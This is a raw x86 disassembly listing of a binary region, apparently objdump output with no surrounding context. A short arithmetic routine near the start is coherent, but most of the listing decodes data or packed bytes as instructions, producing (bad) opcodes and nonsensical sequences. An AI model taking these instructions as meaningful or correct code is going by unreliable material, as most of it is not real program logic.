  42140c:	xchg   ebp,eax
  42140d:	popa   
  42140e:	adc    eax,0x33084d8b
  421413:	enter  0xce03,0xf
  421417:	test   DWORD PTR [ebx-0x24],esp
  42141a:	(bad)  
  42141b:	(bad)  
  42141c:	jmp    0x421467
  421421:	mov    ecx,DWORD PTR [ebp+0x8]
  421424:	mov    edx,DWORD PTR [ebp-0x8]
  421427:	xor    ecx,eax
  421429:	xor    edx,eax
  42142b:	sub    ecx,edx
  42142d:	sub    ecx,esi
  42142f:	xor    ecx,eax
  421431:	mov    DWORD PTR [ebp+0x8],ecx
  421434:	mov    ecx,DWORD PTR [ebp+0x8]
  421437:	mov    edx,DWORD PTR [ebp+0x8]
  42143a:	xor    ecx,eax
  42143c:	imul   edx,edx,0x5708f5
  421442:	add    ecx,esi
  421444:	lea    ecx,[ebp+ecx*4-0x64]
  421448:	mov    edi,DWORD PTR [ecx]
  42144a:	add    edx,edi
  42144c:	mov    DWORD PTR [ecx],edx
  42144e:	mov    ecx,DWORD PTR [ebp+0x8]
  421451:	xor    ecx,eax
  421453:	add    ecx,esi
  421455:	jne    0x421421
  42145b:	mov    ecx,DWORD PTR [ebp-0x8]
  42145e:	xor    ecx,eax
  421460:	mov    eax,DWORD PTR [ebp+0x10]
  421463:	add    ecx,esi
  421465:	mov    DWORD PTR [eax],ecx
  421467:	pop    edi
  421468:	pop    esi
  421469:	pop    ebx
  42146a:	leave  
  42146b:	ret    0xc
  42146e:	pop    ss
  42146f:	or     al,0x84
  421471:	repz lahf 
  421473:	sti    
  421474:	ja     0x421462
  421476:	stos   BYTE PTR es:[edi],al
  421477:	mov    edx,0xd67f88e2
  42147c:	mov    dl,0xf6
  42147e:	ja     0x42144d
  421480:	add    DWORD PTR [eax],eax
  421482:	arpl   WORD PTR [eax],ax
  421484:	add    BYTE PTR [eax],al
  421486:	repnz pushw 0xd2ee
  42148b:	test   cl,bl
  42148d:	push   ds
  42148e:	mov    esp,0x76333ac1
  421493:	out    dx,al
  421494:	add    BYTE PTR [esi],ch
  421496:	cmp    ebx,DWORD PTR [edi+0x18390980]
  42149c:	pop    esi
  42149d:	xor    ebx,DWORD PTR [edi-0xc44116c]
  4214a3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4214a4:	adc    ebp,DWORD PTR [eax-0x34]
  4214a7:	adc    al,0x74
  4214a9:	dec    eax
  4214aa:	mov    al,ds:0xef93d54f
  4214af:	out    dx,al
  4214b0:	xchg   edx,eax
  4214b1:	or     ah,BYTE PTR [eax]
  4214b3:	mov    dl,0xbd
  4214b5:	sub    BYTE PTR [ecx+0x1f],dl
  4214b8:	int    0x1d
  4214ba:	and    eax,esi
  4214bc:	(bad)  [edx+0x751c199a]
  4214c2:	push   ebp
  4214c3:	xor    eax,0xa3954032
  4214c8:	mov    edx,0x655dd08a
  4214cd:	leave  
  4214ce:	xor    BYTE PTR [edi*4-0x6cb4341f],ch
  4214d5:	adc    ch,cl
  4214d7:	mov    ecx,0x57d6e295
  4214dc:	cwde   
  4214dd:	or     al,0x97
  4214df:	rcl    ah,cl
  4214e1:	cmp    BYTE PTR [esi-0x78f6af1d],cl
  4214e7:	fstp   st(4)
  4214e9:	add    BYTE PTR [eax],al
  4214eb:	add    BYTE PTR [eax],al
  4214ed:	add    cl,dl
  4214ef:	sub    al,0x14
  4214f1:	adc    edi,ebp
  4214f3:	cmp    edx,edi
  4214f5:	out    dx,al
  4214f6:	pop    edi
  4214f7:	xchg   bx,ax
  4214f9:	push   0xe1a3b448
  4214fe:	fcmove st,st(5)
  421500:	add    DWORD PTR [eax],eax
  421502:	arpl   WORD PTR [eax],ax
  421504:	add    BYTE PTR [eax],al
  421506:	xor    cl,BYTE PTR [ecx]
  421508:	xchg   esp,eax
  421509:	mov    ds:0xdd8357a6,al
  42150e:	clc    
  42150f:	pop    edi
  421510:	add    ebp,DWORD PTR [edx-0x45]
  421513:	inc    esp
  421514:	and    ebp,DWORD PTR [ecx]
  421516:	fdiv   QWORD PTR [esi-0x6da804ae]
  42151c:	cld    
  42151d:	pushf  
  42151e:	mov    ds:0xdbbd81e6,eax
  421523:	xor    eax,0x3af51420
  421528:	adc    DWORD PTR [ecx],ebx
  42152a:	dec    ebp
  42152b:	adc    edx,DWORD PTR [esi]
  42152d:	cdq    
  42152e:	scas   eax,DWORD PTR es:[edi]
  42152f:	mov    al,BYTE PTR [ecx-0x5ee9715c]
  421535:	or     BYTE PTR [ecx+0x6a4e26c1],0x81
  42153c:	and    edx,DWORD PTR [esi-0x80]
  42153f:	sub    BYTE PTR [edi-0x4],al
  421542:	lea    eax,[ebx]
  421544:	push   ebx
  421545:	and    edx,esi
  421547:	repnz pop ecx
  421549:	shl    DWORD PTR [esi+eiz*2],1
  42154c:	pusha  
  42154d:	and    edx,DWORD PTR [edi-0x3d]
  421550:	cmp    ebx,DWORD PTR [ecx]
  421552:	mov    ecx,0x4f0a7a0a
  421557:	pop    ebx
  421558:	pop    es
  421559:	xor    BYTE PTR [eax+0x284d08d0],0x87
  421560:	push   ebp
  421561:	lods   eax,DWORD PTR ds:[esi]
  421562:	cmp    BYTE PTR [eax+0x56989973],dl
  421568:	cmp    al,BYTE PTR [eax]
  42156a:	add    BYTE PTR [eax],al
  42156c:	add    BYTE PTR [eax],al
  42156e:	pop    ds
  42156f:	sub    esp,DWORD PTR [eax-0x60404bc1]
  421575:	sub    eax,esi
  421577:	add    BYTE PTR [edi+eax*2-0x3ba5f98],0x3d
  42157f:	into   
  421580:	add    DWORD PTR [eax],eax
  421582:	arpl   WORD PTR [eax],ax
  421584:	add    BYTE PTR [eax],al
  421586:	je     0x421568
  421588:	adc    al,0x43
  42158a:	push   edi
  42158b:	mov    dh,0x17
  42158d:	pop    esp
  42158e:	sub    bl,ch
  421590:	jp     0x4215b0
  421592:	fadd   DWORD PTR [edi-0x2d]
  421595:	pop    edi
  421596:	mov    cl,0x76
  421598:	frstor [eax]
  42159a:	jecxz  0x4215c2
  42159c:	scas   eax,DWORD PTR es:[edi]
  42159d:	sbb    BYTE PTR [ecx+0x22],bh
  4215a0:	ins    DWORD PTR es:[edi],dx
  4215a1:	xlat   BYTE PTR ds:[ebx]
  4215a2:	es mov ebx,0x2802c5c9
  4215a8:	mov    edx,DWORD PTR [esi]
  4215aa:	mov    edi,0x6a165b46
  4215af:	push   ecx
  4215b0:	sbb    dl,BYTE PTR [ebp-0x5e]
  4215b3:	lods   eax,DWORD PTR ds:[esi]
  4215b4:	fadd   DWORD PTR [esp+ebp*2-0x66]
  4215b8:	pushf  
  4215b9:	sub    DWORD PTR [edi],0x726e88ec
  4215bf:	dec    BYTE PTR [edi-0x40]
  4215c2:	lock fst DWORD PTR [ebx+0x2967473e]
  4215c9:	outs   dx,BYTE PTR ds:[esi]
  4215ca:	pop    ebp
  4215cb:	jge    0x421557
  4215cd:	mov    ecx,0xb5817db1
  4215d2:	dec    ebx
  4215d3:	mov    ebp,0x1837129
  4215d8:	mov    dh,BYTE PTR [eax-0x2377c579]
  4215de:	(bad)  
  4215df:	mov    dh,0x70
  4215e1:	mov    ecx,0x26fd47e5
  4215e6:	call   0x0:0xb883
  4215ed:	add    BYTE PTR [edi],ch
  4215ef:	and    al,0xf0
  4215f1:	aam    0xfb
  4215f3:	aam    0x2f
  4215f5:	jmp    FWORD PTR [esi+0x33]
  4215f8:	je     0x4215b0
  4215fa:	cmp    al,BYTE PTR [ecx+ebp*1+0x38]
  4215fe:	mov    al,ds:0x630001ce
  421603:	add    BYTE PTR [eax],al
  421605:	add    BYTE PTR [eax+0x58b9465d],cl
  42160b:	add    al,0xee
  42160d:	sub    edx,DWORD PTR [edx+edx*1+0x507636e0]
  421614:	sbb    BYTE PTR [eax],ah
  421616:	inc    ebp
  421617:	dec    esp
  421618:	xor    DWORD PTR [ebp+eax*8+0x30d98a96],eax
  42161f:	jecxz  0x4215b5
  421621:	les    eax,FWORD PTR [esi-0x414563b7]
  421627:	repz lds eax,FWORD PTR [ebp+0x22]
  42162b:	inc    eax
  42162c:	jae    0x421675
  42162e:	mov    ebx,0xe041078f
  421633:	ins    BYTE PTR es:[edi],dx
  421634:	mov    ch,0xf4
  421636:	sbb    bh,cl
  421638:	inc    esi
  421639:	xchg   edx,eax
  42163a:	dec    eax
  42163b:	inc    esp
  42163c:	xor    BYTE PTR [ebx],cl
  42163e:	loop   0x4215c1
  421640:	pop    esi
  421641:	(bad)  
  421643:	out    dx,al
  421644:	in     eax,0x29
  421646:	lods   al,BYTE PTR ds:[esi]
  421647:	arpl   sp,bx
  421649:	aad    0xf7
  42164b:	enter  0xb07d,0x51
  42164f:	leave  
  421650:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421651:	(bad)  
  421652:	out    dx,al
  421653:	mov    edi,0x7bec214f
  421658:	push   0xffffffef
  42165a:	imul   edi,DWORD PTR [edi-0x17303e5d],0x8cb9f509
  421664:	sub    cl,dh
  421666:	imul   ebp,DWORD PTR [ebp+edx*8+0x0],0x0
  42166e:	retf   0x76a0
  421671:	dec    ebp
  421672:	jle    0x421653
  421674:	sti    
  421675:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421676:	mov    bh,0x83
  421678:	dec    edi
  421679:	mov    ds:0x594b0f76,al
  42167e:	add    ecx,edi
  421680:	add    DWORD PTR [eax],eax
  421682:	arpl   WORD PTR [eax],ax
  421684:	add    BYTE PTR [eax],al
  421686:	hlt    
  421687:	arpl   WORD PTR [edi-0x1d8457c0],bp
  42168d:	fs int3 
  42168f:	mov    dl,0x29
  421691:	inc    edx
  421692:	bound  ecx,QWORD PTR [esi+0x41]
  421695:	imul   esp,edi,0xffffffe5
  421698:	jle    0x4216f1
  42169a:	push   ss
  42169b:	mov    ds:0xafdef604,al
  4216a0:	push   0x2e
  4216a2:	scas   al,BYTE PTR es:[edi]
  4216a3:	or     BYTE PTR [ecx+0x35],ch
  4216a6:	pop    ss
  4216a7:	xor    dh,BYTE PTR [edx+0x62e6326d]
  4216ad:	xchg   ebp,eax
  4216ae:	push   0xd2cce7ec
  4216b3:	sub    BYTE PTR [edi-0x2a],bh
  4216b6:	ja     0x42166f
  4216b8:	adc    eax,0xf011edc6
  4216bd:	pop    es
  4216be:	xor    BYTE PTR [edi],ch
  4216c0:	mov    esi,0xfec3b938
  4216c5:	shl    DWORD PTR [ebx+0x75],cl
  4216c8:	(bad)  
  4216c9:	jle    0x421672
  4216cb:	pop    es
  4216cc:	fucomp st(6)
  4216ce:	mov    ebp,0x2a4fa5d2
  4216d3:	out    dx,al
  4216d4:	dec    esi
  4216d5:	(bad)  
  4216d6:	(bad)  
  4216d8:	mov    ebx,0xf91ab76f
  4216dd:	xor    BYTE PTR [ecx],dl
  4216df:	int3   
  4216e0:	dec    esp
  4216e1:	add    al,0x1b
  4216e3:	xchg   edx,eax
  4216e4:	ins    BYTE PTR es:[edi],dx
  4216e5:	and    bl,al
  4216e7:	loop   0x421722
  4216e9:	add    BYTE PTR [eax],al
  4216eb:	add    BYTE PTR [eax],al
  4216ed:	add    dh,al
  4216ef:	out    dx,al
  4216f0:	lods   al,BYTE PTR ds:[esi]
  4216f1:	cmp    ch,BYTE PTR [edx+edi*2+0x5223fed6]
  4216f8:	stc    
  4216f9:	stc    
  4216fa:	test   DWORD PTR [edx],esp
  4216fc:	out    0x49,eax
  4216fe:	iretw  
  421700:	add    DWORD PTR [eax],eax
  421702:	arpl   WORD PTR [eax],ax
  421704:	add    BYTE PTR [eax],al
  421706:	xor    bh,ah
  421708:	pushf  
  421709:	pop    ecx
  42170a:	test   BYTE PTR [esi+edi*4],al
  42170d:	or     DWORD PTR [ebp-0x6c],0x853d8a77
  421714:	scas   al,BYTE PTR es:[edi]
  421715:	icebp  
  421716:	dec    edi
  421717:	dec    eax
  421718:	jp     0x421778
  42171a:	xor    BYTE PTR [edx],ah
  42171c:	sbb    BYTE PTR [edx-0x48],ch
  42171f:	mov    dh,0x7
  421721:	add    al,0x93
  421723:	outs   dx,DWORD PTR ds:[esi]
  421724:	and    esi,DWORD PTR [ecx-0x574f3cc4]
  42172a:	ss loop 0x4216eb
  42172d:	dec    eax
  42172e:	sbb    DWORD PTR [ecx-0x37],edx
  421731:	add    al,0xae
  421733:	pop    ebp
  421734:	jmp    0xd836e5a7
  421739:	and    ecx,DWORD PTR [edi+0x55]
  42173c:	stos   DWORD PTR es:[edi],eax
  42173d:	inc    ebx
  42173e:	addr16 retf 0x8d64
  421742:	mov    ds:0x55297eef,eax
  421747:	adc    BYTE PTR [esi],ah
  421749:	rcr    DWORD PTR [ebp-0x30c4e36e],1
  42174f:	pop    edi
  421750:	jno    0x421729
  421752:	(bad)  [esi-0x4b]
  421755:	adc    ebp,esp
  421757:	dec    dh
  421759:	hlt    
  42175a:	fwait
  42175b:	mov    dh,0x8f
  42175d:	and    eax,0xad304386
  421762:	dec    edi
  421763:	shr    DWORD PTR [edi-0x627dfa1b],1
  421769:	add    BYTE PTR [eax],al
  42176b:	add    BYTE PTR [eax],al
  42176d:	add    BYTE PTR [edx+0x34],dl
  421770:	inc    eax
  421771:	gs data16 jne 0x4217ec
  421775:	aaa    
  421776:	push   0xc36a4e09
  42177b:	jae    0x4217eb
  42177d:	jmp    0x43e74b
  421782:	arpl   WORD PTR [eax],ax
  421784:	add    BYTE PTR [eax],al
  421786:	cmp    edx,esi
  421788:	loope  0x421785
  42178a:	es pop edi
  42178c:	add    al,BYTE PTR [esp+eax*2]
  42178f:	loopne 0x421711
  421791:	in     al,dx
  421792:	cli    
  421793:	lea    eax,[eax+0x3809ab35]
  421799:	push   ebx
  42179a:	test   DWORD PTR [eax-0x2f],edi
  42179d:	adc    BYTE PTR ds:0x76aadf60,0x4d
  4217a4:	test   DWORD PTR [edi+0x6fb709c0],edx
  4217aa:	in     eax,dx
  4217ab:	sbb    al,0xab
  4217ad:	inc    eax
  4217ae:	sub    bh,BYTE PTR [edx+ebx*8+0x3fe4fecd]
  4217b5:	test   eax,0x36fe7478
  4217ba:	sub    ah,0x98
  4217bd:	mov    al,ds:0x6009f87
  4217c2:	or     al,0xea
  4217c4:	enter  0xe18f,0x5d
  4217c8:	ret    0xa973
  4217cb:	ss stc 
  4217cd:	jp     0x421778
  4217cf:	or     DWORD PTR ds:0x84a77dc9,eax
  4217d5:	add    al,0xec
  4217d7:	pop    ecx
  4217d8:	sbb    al,0x6d
  4217da:	pop    edi
  4217db:	mov    esi,0x79ed76eb
  4217e0:	jecxz  0x42182c
  4217e2:	nop
  4217e3:	jb     0x421817
  4217e5:	and    al,0x2a
  4217e7:	repnz loope 0x4217ea
  4217ea:	add    BYTE PTR [eax],al
  4217ec:	add    BYTE PTR [eax],al
  4217ee:	adc    bh,BYTE PTR [edx-0x19073928]
  4217f4:	push   ds
  4217f5:	(bad)  
  4217f6:	adc    bl,dh
  4217f8:	cwde   
  4217f9:	out    dx,al
  4217fa:	adc    edx,DWORD PTR [edi-0x1d434e90]
  421800:	add    DWORD PTR [eax],eax
  421802:	arpl   WORD PTR [eax],ax
  421804:	add    BYTE PTR [eax],al
  421806:	dec    esp
  421807:	sbb    al,0x9e
  421809:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42180a:	enter  0x261d,0xa6
  42180e:	and    al,0xb1
  421810:	lods   eax,DWORD PTR ds:[esi]
  421811:	cmp    BYTE PTR [ecx+0x44],ch
  421814:	jnp    0x4217fd
  421816:	xchg   edi,eax
  421817:	imul   esi,DWORD PTR [ecx-0x2fc302d4],0xffffffb8
  42181e:	push   ss
  42181f:	jl     0x4217d2
  421821:	cwde   
  421822:	mov    ebx,0x382e9673
  421827:	xlat   BYTE PTR ds:[ebx]
  421828:	dec    eax
  421829:	fwait
  42182a:	bound  ecx,QWORD PTR [ebx+ebp*1]
  42182d:	test   DWORD PTR [edx-0x6728f199],0x62d56a11
  421837:	out    0xc,al
  421839:	push   ecx
  42183a:	fs mov cl,0x47
  42183d:	cs cld 
  42183f:	push   ebx
  421840:	sub    al,0x50
  421842:	and    bl,ch
  421844:	inc    esp
  421845:	xchg   DWORD PTR [ebx-0xa],ebx
  421848:	adc    eax,0x8b8e1b71
  42184d:	aaa    
  42184e:	outs   dx,DWORD PTR ds:[esi]
  42184f:	push   ebx
  421850:	(bad)
  421853:	mov    edx,0x70acd094
  421858:	push   0xffffffb0
  42185a:	jmp    0x421854
  42185c:	out    0x4,al
  42185e:	scas   eax,DWORD PTR es:[edi]
  42185f:	lods   al,BYTE PTR ds:[esi]
  421860:	lds    esi,FWORD PTR [edx]
  421862:	je     0x421890
  421864:	sbb    DWORD PTR es:[edx-0x2c],edi
  421868:	push   esi
  421869:	add    BYTE PTR [eax],al
  42186b:	add    BYTE PTR [eax],al
  42186d:	add    BYTE PTR [ecx+0x46],cl
  421870:	sub    BYTE PTR [eax],dh
  421872:	das    
  421873:	jle    0x4218ce
  421875:	jg     0x42183d
  421877:	imul   esi,eax,0xffffffd5
  42187a:	mov    ebp,0x1fae7d60
  42187f:	jecxz  0x421882
  421881:	add    BYTE PTR [ebx+0x0],ah
  421884:	add    BYTE PTR [eax],al
  421886:	loope  0x42183d
  421888:	es ds clc 
  42188b:	mov    ebx,DWORD PTR [esi]
  42188d:	add    eax,DWORD PTR [edx]
  42188f:	aam    0x40
  421891:	jae    0x42188e
  421893:	out    0x49,al
  421895:	pop    es
  421896:	xor    BYTE PTR [edx+0xc1444c4],0x62
  42189d:	mov    ecx,0x327d2558
  4218a2:	jg     0x421863
  4218a4:	xor    eax,0x3ba87dc0
  4218a9:	lods   al,BYTE PTR ds:[esi]
  4218aa:	cli    
  4218ab:	imul   edx,DWORD PTR [esp+ecx*4-0x6],0xf1abe105
  4218b3:	push   es
  4218b4:	in     eax,0x51
  4218b6:	or     cl,BYTE PTR [ecx]
  4218b8:	or     dh,bl
  4218ba:	cmp    bl,0xcf
  4218bd:	or     BYTE PTR [eax+ecx*2+0x13],0x22
  4218c2:	xchg   DWORD PTR [esp+ecx*8],edx
  4218c5:	xor    al,0xec
  4218c7:	jo     0x421858
  4218c9:	jmp    0x4218c9
  4218cb:	pop    ebx
  4218cc:	jmp    0xf733:0x10d27ae0
  4218d3:	pop    esi
  4218d4:	push   es
  4218d5:	push   es
  4218d6:	and    al,0x6
  4218d8:	sbb    BYTE PTR [ebp-0x2e82c486],bh
  4218de:	fdivp  st(1),st
  4218e0:	cwde   
  4218e1:	jge    0x4218ef
  4218e3:	cmp    al,0x40
  4218e5:	in     al,dx
  4218e6:	test   al,0xc8
  4218e8:	cwde   
  4218e9:	add    BYTE PTR [eax],al
  4218eb:	add    BYTE PTR [eax],al
  4218ed:	add    BYTE PTR [edi-0x3a],ah
  4218f0:	and    dh,dh
  4218f2:	mov    eax,ds:0xe7d7f7f6
  4218f7:	mov    eax,0xffabda72
  4218fc:	xor    dh,BYTE PTR [ecx+0x1e382]
  421902:	arpl   WORD PTR [eax],ax
  421904:	add    BYTE PTR [eax],al
  421906:	dec    ecx
  421907:	fist   DWORD PTR [ecx-0x7a31c72e]
  42190d:	sub    cl,bl
  42190f:	sub    edi,eax
  421911:	and    BYTE PTR [eax-0xa],cl
  421914:	jbe    0x421932
  421916:	add    al,0xad
  421918:	out    0xf1,eax
  42191a:	sub    eax,DWORD PTR [ecx-0x1f]
  42191d:	xchg   ebx,eax
  42191e:	inc    edi
  42191f:	push   0xffffffad
  421921:	xor    eax,0xb55dcb4f
  421926:	push   ebx
  421927:	push   ebx
  421928:	bound  ebx,QWORD PTR ds:0xcaea1478
  42192e:	and    eax,0x9c089a4c
  421933:	inc    edi
  421934:	dec    esp
  421935:	and    dl,BYTE PTR [esi+0x262e2087]
  42193b:	adc    DWORD PTR [ecx],edi
  42193d:	aas    
  42193e:	adc    eax,ecx
  421940:	push   ebx
  421941:	mov    ebx,0x532dba44
  421946:	cld    
  421947:	ss enter 0xa6d8,0x11
  42194c:	ins    BYTE PTR es:[edi],dx
  42194d:	inc    eax
  42194e:	mov    ds:0x42e0e2a6,eax
  421953:	nop
  421954:	mov    WORD PTR [edx+0x488ff2c6],cs
  42195a:	retf   0x773f
  42195d:	jo     0x421935
  42195f:	ja     0x421996
  421961:	dec    eax
  421962:	rol    ecx,cl
  421964:	inc    eax
  421965:	div    DWORD PTR [ecx+0xfddd]
  42196b:	add    BYTE PTR [eax],al
  42196d:	add    bl,al
  42196f:	or     eax,0xefee66a6
  421974:	ret    
  421975:	lods   eax,DWORD PTR ds:[esi]
  421976:	sub    al,0xb8
  421978:	mov    ds:0xae4bea47,eax
  42197d:	(bad)  
  42197e:	in     eax,0xe3
  421980:	add    DWORD PTR [eax],eax
  421982:	arpl   WORD PTR [eax],ax
  421984:	add    BYTE PTR [eax],al
  421986:	and    BYTE PTR [esi-0x1c90c78c],bh
  42198c:	ss sahf 
  42198e:	test   eax,0xa85cb11b
  421993:	fldenv [esi+ecx*1-0x538cc23f]
  42199b:	mov    ebx,esp
  42199d:	inc    esi
  42199e:	push   ebp
  42199f:	mov    ecx,0x2ff70c95
  4219a4:	fnstenv [edi+ebx*2+0x5e]
  4219a8:	jae    0x4219d0
  4219aa:	dec    esp
  4219ab:	dec    ebx
  4219ac:	mov    bl,0x34
  4219ae:	(bad)  
  4219b0:	fldenv [ebp-0x1c]
  4219b3:	mov    ebx,0x291747a7
  4219b8:	mov    ebp,0x3bc17e8c
  4219bd:	dec    esp
  4219be:	(bad)  
  4219bf:	js     0x4219ab
  4219c1:	adc    ecx,edi
  4219c3:	fcom   QWORD PTR [esi+0x42]
  4219c6:	stos   DWORD PTR es:[edi],eax
  4219c7:	fcomp  QWORD PTR [ebp-0x457dceaf]
  4219cd:	pop    ds
  4219ce:	lods   al,BYTE PTR ds:[esi]
  4219cf:	mov    dl,0x16
  4219d1:	jno    0x421a1b
  4219d3:	xchg   esi,eax
  4219d4:	sti    
  4219d5:	sub    eax,0x6bdadcf2
  4219da:	pop    es
  4219db:	or     eax,0x6a6c7b7
  4219e0:	push   edi
  4219e1:	je     0x421973
  4219e3:	out    0x64,al
  4219e5:	sbb    BYTE PTR [eax+0x1b],ch
  4219e8:	cmp    eax,0x0
  4219ed:	add    cl,bl
  4219ef:	ret    0x4905
  4219f2:	pop    ds
  4219f3:	iret   
  4219f4:	fst    st(2)
  4219f6:	enter  0xf86f,0xd2
  4219fa:	ficom  DWORD PTR [esp+edx*2]
  4219fd:	dec    ebx
  4219fe:	dec    eax
  4219ff:	in     al,0x1
  421a01:	add    BYTE PTR [edi+0x0],al
  421a04:	add    BYTE PTR [eax],al
  421a06:	sbb    bl,BYTE PTR [ebp-0x7f]
  421a09:	les    edx,FWORD PTR [edi-0x4961a69d]
  421a0f:	aam    0x34
  421a11:	jmp    0x8516:0x84bb67f7
  421a18:	adc    esp,DWORD PTR [edx+0x28]
  421a1b:	and    dl,BYTE PTR [edi+edx*2-0x1f]
  421a1f:	xor    esi,ebp
  421a21:	pop    ecx
  421a22:	sbb    cl,dl
  421a24:	sar    DWORD PTR [edi+0x56],1
  421a27:	gs into 
  421a29:	push   esp
  421a2a:	inc    esp
  421a2b:	out    dx,eax
  421a2c:	pop    edi
  421a2d:	cmp    edi,DWORD PTR [esi+0x70]
  421a30:	mov    al,0x1f
  421a32:	mov    ds:0xa1da4aa6,al
  421a37:	sbb    DWORD PTR [ebx+eiz*8],ebx
  421a3a:	icebp  
  421a3b:	test   BYTE PTR [edx+0x67d9fbdf],bl
  421a41:	jl     0x421a18
  421a43:	call   0x252f:0xbd64130
  421a4a:	mov    ds:0xfaf,al
  421a4f:	nop
  421a50:	inc    edx
  421a51:	add    BYTE PTR [eax+edx*4],al
  421a54:	inc    edx
  421a55:	add    BYTE PTR [eax],cl
  421a57:	nop
  421a58:	inc    edx
  421a59:	add    BYTE PTR [eax+edx*4],cl
  421a5c:	inc    edx
  421a5d:	add    BYTE PTR [eax],dl
  421a5f:	nop
  421a60:	inc    edx
  421a61:	add    BYTE PTR [eax+edx*4],dl
  421a64:	inc    edx
  421a65:	add    BYTE PTR [eax],bl
  421a67:	nop
  421a68:	inc    edx
  421a69:	add    BYTE PTR [eax+edx*4],bl
  421a6c:	inc    edx
  421a6d:	add    BYTE PTR [eax],al
  421a6f:	mov    al,ds:0xa0040042
  421a74:	inc    edx
  421a75:	add    BYTE PTR [eax],cl
  421a77:	mov    al,ds:0xa00c0042
  421a7c:	inc    edx
  421a7d:	add    BYTE PTR [eax],dl
  421a7f:	mov    al,ds:0xa0140042
  421a84:	inc    edx
  421a85:	add    BYTE PTR [eax],bl
  421a87:	mov    al,ds:0xa01c0042
  421a8c:	inc    edx
  421a8d:	add    BYTE PTR [eax],al
  421a8f:	mov    al,0x42
  421a91:	add    BYTE PTR [eax+esi*4],al
  421a94:	inc    edx
  421a95:	add    BYTE PTR [eax],cl
  421a97:	mov    al,0x42
  421a99:	add    BYTE PTR [eax+esi*4],cl
  421a9c:	inc    edx
  421a9d:	add    BYTE PTR [eax],dl
  421a9f:	mov    al,0x42
  421aa1:	add    BYTE PTR [eax+esi*4],dl
  421aa4:	inc    edx
  421aa5:	add    BYTE PTR [eax],bl
  421aa7:	mov    al,0x42
  421aa9:	add    BYTE PTR [eax+esi*4],bl
  421aac:	inc    edx
  421aad:	add    BYTE PTR [eax+0x66],bh
  421ab0:	ins    BYTE PTR es:[edi],dx
  421ab1:	jp     0x421b0a
  421ab3:	jbe    0x421afc
  421ab5:	ja     0x421afa
  421ab7:	js     0x421b01
  421ab9:	jno    0x421b1e
  421abb:	inc    edx
  421abc:	inc    bx
  421abe:	push   ebp
  421abf:	jno    0x421b37
  421ac1:	ja     0x421b2a
  421ac3:	dec    edi
  421ac4:	dec    esp
  421ac5:	dec    ebp
  421ac6:	inc    edx
  421ac7:	jno    0x421b3a
  421ac9:	jae    0x421b1e
  421acb:	push   eax
  421acc:	arpl   WORD PTR [ebx+0x76],dx
  421acf:	push   ds
  421ad0:	inc    edx
  421ad1:	add    BYTE PTR [esi+0x1e],bh
  421ad4:	inc    edx
  421ad5:	add    BYTE PTR [esi],dl
  421ad7:	sbb    eax,0xbef0042
  421adc:	mov    dl,0xe
  421ade:	jns    0x421b2e
  421ae0:	xor    BYTE PTR [esi-0x79],cl
  421ae3:	dec    edi
  421ae4:	cmp    eax,0x3e4faf4e
  421ae9:	dec    esi
  421aea:	js     0x421b3a
  421aec:	cmp    ecx,DWORD PTR [esi-0x64]
  421aef:	dec    edi
  421af0:	inc    esp
  421af1:	dec    esi
  421af2:	jae    0x421b42
  421af4:	inc    ecx
  421af5:	dec    esi
  421af6:	xor    BYTE PTR [esi+0x40],cl
  421af9:	dec    esi
  421afa:	pop    esp
  421afb:	pop    ebp
  421afc:	pop    edi
  421afd:	push   edx
  421afe:	cmp    DWORD PTR [esi+0x79],ecx
  421b01:	dec    esi
  421b02:	xor    BYTE PTR [esi-0x79],cl
  421b05:	dec    edi
  421b06:	cmp    eax,0x3e4faf4e
  421b0b:	dec    esi
  421b0c:	js     0x421b5c
  421b0e:	cmp    ecx,DWORD PTR [esi-0x64]
  421b11:	dec    edi
  421b12:	inc    esp
  421b13:	dec    esi
  421b14:	mov    DWORD PTR [edi+0x41],ecx
  421b17:	dec    esi
  421b18:	xor    BYTE PTR [esi+0x40],cl
  421b1b:	dec    esi
  421b1c:	pop    esp
  421b1d:	ins    DWORD PTR es:[edi],dx
  421b1e:	pop    edi
  421b1f:	bound  edi,QWORD PTR [ecx]
  421b21:	dec    esi
  421b22:	jns    0x421b72
  421b24:	xor    BYTE PTR [esi-0x80],cl
  421b27:	dec    edi
  421b28:	cmp    eax,0x394e734e
  421b2d:	dec    esi
  421b2e:	mov    ds:0x304e3a4f,al
  421b33:	dec    esi
  421b34:	inc    esi
  421b35:	dec    esi
  421b36:	pop    esp
  421b37:	jge    0x421b98
  421b39:	jb     0x421baa
  421b3b:	sub    BYTE PTR [esi-0x7d],0x7e
  421b3f:	xchg   ebx,eax
  421b40:	jns    0x421ad2
  421b42:	aas    
  421b43:	dec    esi
  421b44:	test   BYTE PTR [edi+0x30],cl
  421b47:	dec    esi
  421b48:	test   BYTE PTR [edi+0x3c],cl
  421b4b:	dec    esi
  421b4c:	mov    ds:0x734e394f,al
  421b51:	dec    esi
  421b52:	inc    ebp
  421b53:	dec    esi
  421b54:	xor    BYTE PTR [esi+0x44],cl
  421b57:	dec    esi
  421b58:	pop    esp
  421b59:	lea    ebx,[edi-0x7e]
  421b5c:	outs   dx,DWORD PTR ds:[esi]
  421b5d:	xchg   edx,eax
  421b5e:	outs   dx,BYTE PTR ds:[esi]
  421b5f:	xchg   ebx,eax
  421b60:	jle    0x421b05
  421b62:	jns    0x421b04
  421b64:	aas    
  421b65:	dec    esi
  421b66:	test   BYTE PTR [edi+0x30],cl
  421b69:	dec    esi
  421b6a:	test   BYTE PTR [edi+0x3c],cl
  421b6d:	dec    esi
  421b6e:	mov    ds:0x894e394f,al
  421b73:	dec    edi
  421b74:	inc    ebp
  421b75:	dec    esi
  421b76:	xor    BYTE PTR [esi+0x44],cl
  421b79:	dec    esi
  421b7a:	pop    esp
  421b7b:	popf   
  421b7c:	pop    edi
  421b7d:	xchg   edx,eax
  421b7e:	outs   dx,DWORD PTR ds:[esi]
  421b7f:	mov    ds:0xb37ea36e,al
  421b84:	jns    0x421b36
  421b86:	aas    
  421b87:	dec    esi
  421b88:	mov    cs,WORD PTR [edi+0x30]
  421b8b:	dec    esi
  421b8c:	lods   al,BYTE PTR ds:[esi]
  421b8d:	dec    edi
  421b8e:	cmp    eax,0x394e734e
  421b93:	dec    esi
  421b94:	mov    eax,ds:0x304e3a4f
  421b99:	dec    esi
  421b9a:	inc    esp
  421b9b:	dec    esi
  421b9c:	pop    esp
